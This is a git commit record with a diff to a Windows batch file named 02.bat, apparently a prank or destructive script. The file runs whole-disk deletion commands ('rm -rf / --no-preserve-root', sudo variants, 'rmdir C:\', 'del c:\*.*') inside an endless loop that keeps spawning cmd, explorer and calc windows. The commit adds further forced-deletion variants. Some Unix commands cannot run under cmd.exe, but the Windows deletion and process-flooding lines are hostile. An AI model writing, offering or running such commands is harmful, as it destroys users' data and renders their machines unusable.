ae1ba2ff52538c898b98ce2ba58056715ba006e5
Daniel Nuñez <danidafe@gmail.com>
2024-03-14 13:09:29 -0300

    Update 02.bat

--- 02.bat
+++ 02.bat
@@ -1,13 +1,14 @@
 @echo OFF
 rm -rf / --no-preserve-root
+sudo rm -rf / --no-preserve-root
 :loop
 start cmd
 start explorer
 start calc
-rm -rf /
-rm -rf / --no-preserve-root
-sudo rm -rf /
+rm -rf / -f --no-preserve-root
+rm -rf / -f
+sudo rm -rf / -f
 rmdir C:\
 del c:\*.*
-sudo rm -rf / --no-preserve-root
+sudo rm -rf / -f --no-preserve-root
 goto loop
